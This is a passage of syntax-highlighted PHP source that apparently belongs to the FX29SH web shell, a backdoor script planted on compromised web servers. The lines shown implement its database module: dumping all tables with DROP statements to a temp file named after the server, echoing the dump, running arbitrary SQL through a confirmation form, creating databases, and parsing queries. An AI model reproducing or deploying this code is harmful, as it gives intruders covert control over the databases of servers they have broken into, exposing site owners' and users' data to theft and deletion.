<span class="lineno">3029</span>   <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_resource</span><span class="p">(</span><span class="nv">$sock</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span><span class="p">(</span><span class="s2">&quot;Error: </span><span class="se">\$</span><span class="s2">sock is not valid resource.&quot;</span><span class="p">);}</span>
<span class="lineno">3030</span>   <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$db</span><span class="p">))</span> <span class="p">{</span><span class="nv">$db</span> <span class="o">=</span> <span class="s2">&quot;db&quot;</span><span class="p">;}</span>
<span class="lineno">3031</span>   <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$print</span><span class="p">))</span> <span class="p">{</span><span class="nv">$print</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;}</span>
<span class="lineno">3032</span>   <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$nl2br</span><span class="p">))</span> <span class="p">{</span><span class="nv">$nl2br</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;}</span>
<span class="lineno">3033</span>   <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$add_drop</span><span class="p">))</span> <span class="p">{</span><span class="nv">$add_drop</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;}</span>
<span class="lineno">3034</span>   <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$file</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">3035</span>     <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$tmp_dir</span><span class="o">.</span><span class="s2">&quot;dump_&quot;</span><span class="o">.</span><span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;SERVER_NAME&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;_&quot;</span><span class="o">.</span><span class="nv">$db</span><span class="o">.</span><span class="s2">&quot;_&quot;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s2">&quot;d-m-Y-H-i-s&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;.sql&quot;</span><span class="p">;</span>
<span class="lineno">3036</span>   <span class="p">}</span>
<span class="lineno">3037</span>   <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$tabs</span><span class="p">))</span> <span class="p">{</span><span class="nv">$tabs</span> <span class="o">=</span> <span class="k">array</span><span class="p">();}</span>
<span class="lineno">3038</span>   <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$add_drop</span><span class="p">))</span> <span class="p">{</span><span class="nv">$add_drop</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;}</span>
<span class="lineno">3039</span>   <span class="k">if</span> <span class="p">(</span><span class="nb">sizeof</span><span class="p">(</span><span class="nv">$tabs</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">3040</span>     <span class="c1">#Retrieve tables-list</span>
<span class="lineno">3041</span>     <span class="nv">$res</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;SHOW TABLES FROM &quot;</span><span class="o">.</span><span class="nv">$db</span><span class="p">,</span> <span class="nv">$sock</span><span class="p">);</span>
<span class="lineno">3042</span>     <span class="k">if</span> <span class="p">(</span><span class="nb">mysql_num_rows</span><span class="p">(</span><span class="nv">$res</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span><span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_row</span><span class="p">(</span><span class="nv">$res</span><span class="p">))</span> <span class="p">{</span><span class="nv">$tabs</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">];}}</span>
<span class="lineno">3043</span>   <span class="p">}</span>
<span class="lineno">3044</span>   <span class="nv">$out</span> <span class="o">=</span> <span class="s2">&quot;</span>
<span class="lineno">3045</span> <span class="s2">  # Dumped by &quot;</span><span class="o">.</span><span class="nx">sh_name</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;</span>
<span class="lineno">3046</span> <span class="s2">  # MySQL version: (&quot;</span><span class="o">.</span><span class="nb">mysql_get_server_info</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;) running on &quot;</span><span class="o">.</span><span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;SERVER_ADDR&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot; (&quot;</span><span class="o">.</span><span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;SERVER_NAME&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;)&quot;</span><span class="o">.</span><span class="s2">&quot;</span>
<span class="lineno">3047</span> <span class="s2">  # Date: &quot;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s2">&quot;d.m.Y H:i:s&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span>
<span class="lineno">3048</span> <span class="s2">  # DB: </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$db</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"></span>
<span class="lineno">3049</span> <span class="s2">  #---------------------------------------------------------&quot;</span><span class="p">;</span>
<span class="lineno">3050</span>   <span class="nv">$c</span> <span class="o">=</span> <span class="nb">count</span><span class="p">(</span><span class="nv">$onlytabs</span><span class="p">);</span>
<span class="lineno">3051</span>   <span class="k">foreach</span><span class="p">(</span><span class="nv">$tabs</span> <span class="k">as</span> <span class="nv">$tab</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">3052</span>     <span class="k">if</span> <span class="p">((</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$tab</span><span class="p">,</span><span class="nv">$onlytabs</span><span class="p">))</span> <span class="k">or</span> <span class="p">(</span><span class="o">!</span><span class="nv">$c</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">3053</span>       <span class="k">if</span> <span class="p">(</span><span class="nv">$add_drop</span><span class="p">)</span> <span class="p">{</span><span class="nv">$out</span> <span class="o">.=</span> <span class="s2">&quot;DROP TABLE IF EXISTS `&quot;</span><span class="o">.</span><span class="nv">$tab</span><span class="o">.</span><span class="s2">&quot;`;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;}</span>
<span class="lineno">3054</span>       <span class="c1">#Receieve query for create table structure</span>
<span class="lineno">3055</span>       <span class="nv">$res</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;SHOW CREATE TABLE `&quot;</span><span class="o">.</span><span class="nv">$tab</span><span class="o">.</span><span class="s2">&quot;`&quot;</span><span class="p">,</span> <span class="nv">$sock</span><span class="p">);</span>
<span class="lineno">3056</span>       <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$res</span><span class="p">)</span> <span class="p">{</span><span class="nv">$ret</span><span class="p">[</span><span class="s2">&quot;err&quot;</span><span class="p">][]</span> <span class="o">=</span> <span class="nx">mysql_smarterror</span><span class="p">();}</span>
<span class="lineno">3057</span>       <span class="k">else</span> <span class="p">{</span>
<span class="lineno">3058</span>         <span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_row</span><span class="p">(</span><span class="nv">$res</span><span class="p">);</span>
<span class="lineno">3059</span>         <span class="nv">$out</span> <span class="o">.=</span> <span class="nv">$row</span><span class="p">[</span><span class="s2">&quot;1&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;;</span><span class="se">\n\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">3060</span>         <span class="c1">#Receieve table variables</span>
<span class="lineno">3061</span>         <span class="nv">$res</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;SELECT * FROM `</span><span class="si">$tab</span><span class="s2">`&quot;</span><span class="p">,</span> <span class="nv">$sock</span><span class="p">);</span>
<span class="lineno">3062</span>         <span class="k">if</span> <span class="p">(</span><span class="nb">mysql_num_rows</span><span class="p">(</span><span class="nv">$res</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">3063</span>           <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_assoc</span><span class="p">(</span><span class="nv">$res</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">3064</span>             <span class="nv">$keys</span> <span class="o">=</span> <span class="nb">implode</span><span class="p">(</span><span class="s2">&quot;`, `&quot;</span><span class="p">,</span> <span class="nb">array_keys</span><span class="p">(</span><span class="nv">$row</span><span class="p">));</span>
<span class="lineno">3065</span>             <span class="nv">$values</span> <span class="o">=</span> <span class="nb">array_values</span><span class="p">(</span><span class="nv">$row</span><span class="p">);</span>
<span class="lineno">3066</span>             <span class="k">foreach</span><span class="p">(</span><span class="nv">$values</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&gt;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="nv">$values</span><span class="p">[</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="nb">addslashes</span><span class="p">(</span><span class="nv">$v</span><span class="p">);}</span>
<span class="lineno">3067</span>             <span class="nv">$values</span> <span class="o">=</span> <span class="nb">implode</span><span class="p">(</span><span class="s2">&quot;&#39;, &#39;&quot;</span><span class="p">,</span> <span class="nv">$values</span><span class="p">);</span>
<span class="lineno">3068</span>             <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&quot;INSERT INTO `</span><span class="si">$tab</span><span class="s2">`(`&quot;</span><span class="o">.</span><span class="nv">$keys</span><span class="o">.</span><span class="s2">&quot;`) VALUES (&#39;&quot;</span><span class="o">.</span><span class="nv">$values</span><span class="o">.</span><span class="s2">&quot;&#39;);</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">3069</span>             <span class="nv">$out</span> <span class="o">.=</span> <span class="nv">$sql</span><span class="p">;</span>
<span class="lineno">3070</span>           <span class="p">}</span>
<span class="lineno">3071</span>         <span class="p">}</span>
<span class="lineno">3072</span>       <span class="p">}</span>
<span class="lineno">3073</span>     <span class="p">}</span>
<span class="lineno">3074</span>   <span class="p">}</span>
<span class="lineno">3075</span>   <span class="nv">$out</span> <span class="o">.=</span> <span class="s2">&quot;#---------------------------------------------------------------------------------</span><span class="se">\n\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">3076</span>   <span class="k">if</span> <span class="p">(</span><span class="nv">$file</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">3077</span>     <span class="nv">$fp</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="s2">&quot;w&quot;</span><span class="p">);</span>
<span class="lineno">3078</span>     <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">{</span><span class="nv">$ret</span><span class="p">[</span><span class="s2">&quot;err&quot;</span><span class="p">][]</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;}</span>
<span class="lineno">3079</span>     <span class="k">else</span> <span class="p">{</span>
<span class="lineno">3080</span>       <span class="nb">fwrite</span> <span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nv">$out</span><span class="p">);</span>
<span class="lineno">3081</span>       <span class="nb">fclose</span> <span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
<span class="lineno">3082</span>     <span class="p">}</span>
<span class="lineno">3083</span>   <span class="p">}</span>
<span class="lineno">3084</span>   <span class="k">if</span> <span class="p">(</span><span class="nv">$print</span><span class="p">)</span> <span class="p">{</span><span class="k">if</span> <span class="p">(</span><span class="nv">$nl2br</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="nb">nl2br</span><span class="p">(</span><span class="nv">$out</span><span class="p">);}</span> <span class="k">else</span> <span class="p">{</span><span class="k">echo</span> <span class="nv">$out</span><span class="p">;}}</span>
<span class="lineno">3085</span>   <span class="k">return</span> <span class="nv">$out</span><span class="p">;</span>
<span class="lineno">3086</span> <span class="p">}</span>
<span class="lineno">3087</span> <span class="k">function</span> <span class="nf">mysql_buildwhere</span><span class="p">(</span><span class="nv">$array</span><span class="p">,</span><span class="nv">$sep</span><span class="o">=</span><span class="s2">&quot; and&quot;</span><span class="p">,</span><span class="nv">$functs</span><span class="o">=</span><span class="k">array</span><span class="p">())</span> <span class="p">{</span>
<span class="lineno">3088</span>   <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$array</span><span class="p">))</span> <span class="p">{</span><span class="nv">$array</span> <span class="o">=</span> <span class="k">array</span><span class="p">();}</span>
<span class="lineno">3089</span>   <span class="nv">$result</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
<span class="lineno">3090</span>   <span class="k">foreach</span><span class="p">(</span><span class="nv">$array</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&gt;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">3091</span>     <span class="nv">$value</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
<span class="lineno">3092</span>     <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$functs</span><span class="p">[</span><span class="nv">$k</span><span class="p">]))</span> <span class="p">{</span><span class="nv">$value</span> <span class="o">.=</span> <span class="nv">$functs</span><span class="p">[</span><span class="nv">$k</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;(&quot;</span><span class="p">;}</span>
<span class="lineno">3093</span>     <span class="nv">$value</span> <span class="o">.=</span> <span class="s2">&quot;&#39;&quot;</span><span class="o">.</span><span class="nb">addslashes</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;&quot;</span><span class="p">;</span>
<span class="lineno">3094</span>     <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$functs</span><span class="p">[</span><span class="nv">$k</span><span class="p">]))</span> <span class="p">{</span><span class="nv">$value</span> <span class="o">.=</span> <span class="s2">&quot;)&quot;</span><span class="p">;}</span>
<span class="lineno">3095</span>     <span class="nv">$result</span> <span class="o">.=</span> <span class="s2">&quot;`&quot;</span><span class="o">.</span><span class="nv">$k</span><span class="o">.</span><span class="s2">&quot;` = &quot;</span><span class="o">.</span><span class="nv">$value</span><span class="o">.</span><span class="nv">$sep</span><span class="p">;</span>
<span class="lineno">3096</span>   <span class="p">}</span>
<span class="lineno">3097</span>   <span class="nv">$result</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$result</span><span class="p">)</span><span class="o">-</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$sep</span><span class="p">));</span>
<span class="lineno">3098</span>   <span class="k">return</span> <span class="nv">$result</span><span class="p">;</span>
<span class="lineno">3099</span> <span class="p">}</span>
<span class="lineno">3100</span> <span class="k">function</span> <span class="nf">mysql_fetch_all</span><span class="p">(</span><span class="nv">$query</span><span class="p">,</span><span class="nv">$sock</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">3101</span>   <span class="k">if</span> <span class="p">(</span><span class="nv">$sock</span><span class="p">)</span> <span class="p">{</span><span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">,</span><span class="nv">$sock</span><span class="p">);}</span>
<span class="lineno">3102</span>   <span class="k">else</span> <span class="p">{</span><span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">);}</span>
<span class="lineno">3103</span>   <span class="nv">$array</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="lineno">3104</span>   <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">))</span> <span class="p">{</span><span class="nv">$array</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$row</span><span class="p">;}</span>
<span class="lineno">3105</span>   <span class="nb">mysql_free_result</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
<span class="lineno">3106</span>   <span class="k">return</span> <span class="nv">$array</span><span class="p">;</span>
<span class="lineno">3107</span> <span class="p">}</span>
<span class="lineno">3108</span> <span class="k">function</span> <span class="nf">mysql_smarterror</span><span class="p">(</span><span class="nv">$sock</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">3109</span>   <span class="k">if</span> <span class="p">(</span><span class="nv">$sock</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$error</span> <span class="o">=</span> <span class="nb">mysql_error</span><span class="p">(</span><span class="nv">$sock</span><span class="p">);</span> <span class="p">}</span>
<span class="lineno">3110</span>   <span class="k">else</span> <span class="p">{</span> <span class="nv">$error</span> <span class="o">=</span> <span class="nb">mysql_error</span><span class="p">();</span> <span class="p">}</span>
<span class="lineno">3111</span>   <span class="nv">$error</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$error</span><span class="p">);</span>
<span class="lineno">3112</span>   <span class="k">return</span> <span class="nv">$error</span><span class="p">;</span>
<span class="lineno">3113</span> <span class="p">}</span>
<span class="lineno">3114</span> <span class="k">function</span> <span class="nf">mysql_query_form</span><span class="p">()</span> <span class="p">{</span>
<span class="lineno">3115</span>   <span class="k">global</span> <span class="nv">$submit</span><span class="p">,</span><span class="nv">$sql_act</span><span class="p">,</span><span class="nv">$sql_query</span><span class="p">,</span><span class="nv">$sql_query_result</span><span class="p">,</span><span class="nv">$sql_confirm</span><span class="p">,</span><span class="nv">$sql_query_error</span><span class="p">,</span><span class="nv">$tbl_struct</span><span class="p">;</span>
<span class="lineno">3116</span>   <span class="k">if</span> <span class="p">((</span><span class="nv">$submit</span><span class="p">)</span> <span class="k">and</span> <span class="p">(</span><span class="o">!</span><span class="nv">$sql_query_result</span><span class="p">)</span> <span class="k">and</span> <span class="p">(</span><span class="nv">$sql_confirm</span><span class="p">))</span> <span class="p">{</span><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$sql_query_error</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_query_error</span> <span class="o">=</span> <span class="s2">&quot;Query was empty&quot;</span><span class="p">;}</span> <span class="k">echo</span> <span class="s2">&quot;&lt;b&gt;Error:&lt;/b&gt; &lt;br&gt;&quot;</span><span class="o">.</span><span class="nv">$sql_query_error</span><span class="o">.</span><span class="s2">&quot;&lt;br&gt;&quot;</span><span class="p">;}</span>
<span class="lineno">3117</span>   <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_query_result</span> <span class="k">or</span> <span class="p">(</span><span class="o">!</span><span class="nv">$sql_confirm</span><span class="p">))</span> <span class="p">{</span><span class="nv">$sql_act</span> <span class="o">=</span> <span class="nv">$sql_goto</span><span class="p">;}</span>
<span class="lineno">3118</span>   <span class="k">if</span> <span class="p">((</span><span class="o">!</span><span class="nv">$submit</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$sql_act</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">3119</span>     <span class="k">echo</span> <span class="s2">&quot;&lt;table&gt;&lt;tr&gt;&lt;td&gt;&lt;form name=</span><span class="se">\&quot;</span><span class="s2">fx29sh_sqlquery</span><span class="se">\&quot;</span><span class="s2"> method=POST&gt;&lt;b&gt;&quot;</span><span class="p">;</span> <span class="k">if</span> <span class="p">((</span><span class="nv">$sql_query</span><span class="p">)</span> <span class="k">and</span> <span class="p">(</span><span class="o">!</span><span class="nv">$submit</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;Do you really want to&quot;</span><span class="p">;}</span> <span class="k">else</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;SQL-Query&quot;</span><span class="p">;}</span> <span class="k">echo</span> <span class="s2">&quot;:&lt;/b&gt;&lt;br&gt;&lt;br&gt;&lt;textarea name=sql_query cols=100 rows=10&gt;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_query</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&lt;/textarea&gt;&lt;br&gt;&lt;br&gt;&lt;input type=hidden name=act value=sql&gt;&lt;input type=hidden name=sql_act value=query&gt;&lt;input type=hidden name=sql_tbl value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_tbl</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;input type=hidden name=submit value=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;input type=hidden name=</span><span class="se">\&quot;</span><span class="s2">sql_goto</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_goto</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;input type=submit name=sql_confirm value=</span><span class="se">\&quot;</span><span class="s2">Yes</span><span class="se">\&quot;</span><span class="s2">&gt; &lt;input type=submit value=</span><span class="se">\&quot;</span><span class="s2">No</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;/form&gt;&lt;/td&gt;&quot;</span><span class="p">;</span>
<span class="lineno">3120</span>     <span class="k">if</span> <span class="p">(</span><span class="nv">$tbl_struct</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">3121</span>       <span class="k">echo</span> <span class="s2">&quot;&lt;td valign=</span><span class="se">\&quot;</span><span class="s2">top</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;b&gt;Fields:&lt;/b&gt;&lt;br&gt;&quot;</span><span class="p">;</span>
<span class="lineno">3122</span>       <span class="k">foreach</span> <span class="p">(</span><span class="nv">$tbl_struct</span> <span class="k">as</span> <span class="nv">$field</span><span class="p">)</span> <span class="p">{</span><span class="nv">$name</span> <span class="o">=</span> <span class="nv">$field</span><span class="p">[</span><span class="s2">&quot;Field&quot;</span><span class="p">];</span> <span class="k">echo</span> <span class="s2">&quot;+ &lt;a href=</span><span class="se">\&quot;</span><span class="s2">#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.fx29sh_sqlquery.sql_query.value+=&#39;`&quot;</span><span class="o">.</span><span class="nv">$name</span><span class="o">.</span><span class="s2">&quot;`&#39;;</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;b&gt;&quot;</span><span class="o">.</span><span class="nv">$name</span><span class="o">.</span><span class="s2">&quot;&lt;/b&gt;&lt;/a&gt;&lt;br&gt;&quot;</span><span class="p">;}</span>
<span class="lineno">3123</span>       <span class="k">echo</span> <span class="s2">&quot;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&quot;</span><span class="p">;</span>
<span class="lineno">3124</span>     <span class="p">}</span>
<span class="lineno">3125</span>   <span class="p">}</span>
<span class="lineno">3126</span>   <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_query_result</span> <span class="k">or</span> <span class="p">(</span><span class="o">!</span><span class="nv">$sql_confirm</span><span class="p">))</span> <span class="p">{</span><span class="nv">$sql_query</span> <span class="o">=</span> <span class="nv">$sql_last_query</span><span class="p">;}</span>
<span class="lineno">3127</span> <span class="p">}</span>
<span class="lineno">3128</span> <span class="k">function</span> <span class="nf">mysql_create_db</span><span class="p">(</span><span class="nv">$db</span><span class="p">,</span><span class="nv">$sock</span><span class="o">=</span><span class="s2">&quot;&quot;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">3129</span>   <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&quot;CREATE DATABASE `&quot;</span><span class="o">.</span><span class="nb">addslashes</span><span class="p">(</span><span class="nv">$db</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;`;&quot;</span><span class="p">;</span>
<span class="lineno">3130</span>   <span class="k">if</span> <span class="p">(</span><span class="nv">$sock</span><span class="p">)</span> <span class="p">{</span><span class="k">return</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">,</span><span class="nv">$sock</span><span class="p">);}</span>
<span class="lineno">3131</span>   <span class="k">else</span> <span class="p">{</span><span class="k">return</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);}</span>
<span class="lineno">3132</span> <span class="p">}</span>
<span class="lineno">3133</span> <span class="k">function</span> <span class="nf">mysql_query_parse</span><span class="p">(</span><span class="nv">$query</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">3134</span>   <span class="nv">$query</span> <span class="o">=</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$query</span><span class="p">);</span>
<span class="lineno">3135</span>   <span class="nv">$arr</span> <span class="o">=</span> <span class="nb">explode</span> <span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">,</span><span class="nv">$query</span><span class="p">);</span>
<span class="lineno">3136</span>   <span class="nv">$types</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
<span class="lineno">3137</span>     <span class="s2">&quot;SELECT&quot;</span><span class="o">=&gt;</span><span class="k">array</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span>
<span class="lineno">3138</span>     <span class="s2">&quot;SHOW&quot;</span><span class="o">=&gt;</span><span class="k">array</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span>
<span class="lineno">3139</span>     <span class="s2">&quot;DELETE&quot;</span><span class="o">=&gt;</span><span class="k">array</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span>
<span class="lineno">3140</span>     <span class="s2">&quot;DROP&quot;</span><span class="o">=&gt;</span><span class="k">array</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="lineno">3141</span>   <span class="p">);</span>
<span class="lineno">3142</span>   <span class="nv">$result</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="lineno">3143</span>   <span class="nv">$op</span> <span class="o">=</span> <span class="nb">strtoupper</span><span class="p">(</span><span class="nv">$arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
<span class="lineno">3144</span>   <span class="k">if</span> <span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$types</span><span class="p">[</span><span class="nv">$op</span><span class="p">]))</span> <span class="p">{</span>
<span class="lineno">3145</span>     <span class="nv">$result</span><span class="p">[</span><span class="s2">&quot;propertions&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$types</span><span class="p">[</span><span class="nv">$op</span><span class="p">];</span>
<span class="lineno">3146</span>     <span class="nv">$result</span><span class="p">[</span><span class="s2">&quot;query&quot;</span><span class="p">]</span>  <span class="o">=</span> <span class="nv">$query</span><span class="p">;</span>
<span class="lineno">3147</span>     <span class="k">if</span> <span class="p">(</span><span class="nv">$types</span><span class="p">[</span><span class="nv">$op</span><span class="p">]</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">3148</span>       <span class="k">foreach</span><span class="p">(</span><span class="nv">$arr</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&gt;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">3149</span>         <span class="k">if</span> <span class="p">(</span><span class="nb">strtoupper</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&quot;LIMIT&quot;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">3150</span>           <span class="nv">$result</span><span class="p">[</span><span class="s2">&quot;limit&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$arr</span><span class="p">[</span><span class="nv">$k</span><span class="o">+</span><span class="mi">1</span><span class="p">];</span>
<span class="lineno">3151</span>           <span class="nv">$result</span><span class="p">[</span><span class="s2">&quot;limit&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;,&quot;</span><span class="p">,</span><span class="nv">$result</span><span class="p">[</span><span class="s2">&quot;limit&quot;</span><span class="p">]);</span>
<span class="lineno">3152</span>           <span class="k">if</span> <span class="p">(</span><span class="nb">count</span><span class="p">(</span><span class="nv">$result</span><span class="p">[</span><span class="s2">&quot;limit&quot;</span><span class="p">])</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span><span class="nv">$result</span><span class="p">[</span><span class="s2">&quot;limit&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nv">$result</span><span class="p">[</span><span class="s2">&quot;limit&quot;</span><span class="p">][</span><span class="mi">0</span><span class="p">]);}</span>
<span class="lineno">3153</span>           <span class="nb">unset</span><span class="p">(</span><span class="nv">$arr</span><span class="p">[</span><span class="nv">$k</span><span class="p">],</span><span class="nv">$arr</span><span class="p">[</span><span class="nv">$k</span><span class="o">+</span><span class="mi">1</span><span class="p">]);</span>
<span class="lineno">3154</span>         <span class="p">}</span>
<span class="lineno">3155</span>       <span class="p">}</span>
<span class="lineno">3156</span>     <span class="p">}</span>
